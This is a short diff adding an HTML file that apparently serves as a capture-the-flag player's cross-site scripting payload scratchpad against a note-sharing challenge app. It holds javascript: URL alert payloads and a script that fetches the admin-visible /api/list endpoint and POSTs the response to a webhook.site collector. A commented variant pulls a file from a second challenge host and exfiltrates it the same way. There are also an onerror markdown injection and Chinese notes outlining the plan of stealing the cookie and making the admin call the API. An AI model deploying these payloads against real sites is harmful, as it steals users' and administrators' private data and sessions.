@@ -1,0 +1,42 @@
+<a href="javascript:alert('XSS')">Click Me</a>
+<img src="javascript:alert('XSS')" />
+<a href="http://ctf-note.splitline.tw:9527/api/list">Click Me</a>
+
+<script>
+    fetch('http://ctf-note.splitline.tw:9527/api/list').then((response) => {
+        return response.text()
+    }).then((textResponse) => {
+        console.log(textResponse)
+        // textResponse = textResponse.slice(200)
+        fetch(`https://webhook.site/54ca75b9-90e6-4e97-b469-4543e26575ca`, {
+            method: 'POST',
+            body: textResponse
+        });
+
+    })
+
+    // fetch('http://zero-storage-eof-ctf.csie.org:1310/view?filename=maSAAkI-kiSHIbE-sONG-for-1310_hepHNKnZQntYd0pd.txt">maSAAkI-kiSHIbE-sONG-for-1310_hepHNKnZQntYd0pd.txt').then((response) => {
+    //     return response.text()
+    // }).then((textResponse) => {
+    //     // textResponse = textResponse.slice(200)
+    //     fetch(`https://webhook.site/54ca75b9-90e6-4e97-b469-4543e26575ca?res=${textResponse}`, {
+    //         method: 'POST',
+    //         body: textResponse
+    //     });
+
+    // })
+</script>
+
+<!-- ![Uh oh...]("onerror="fetch('https://webhook.site/54ca75b9-90e6-4e97-b469-4543e26575ca'))
+
+http://ctf-note.splitline.tw:9527/api/list
+
+<script>
+    fetch(`http://ctf-note.splitline.tw:9527/report`, {
+            method: 'POST',
+            body: textResponse
+        });
+</script>
+
+拿cookie > call api
+讓admin自己call api > webhook -->
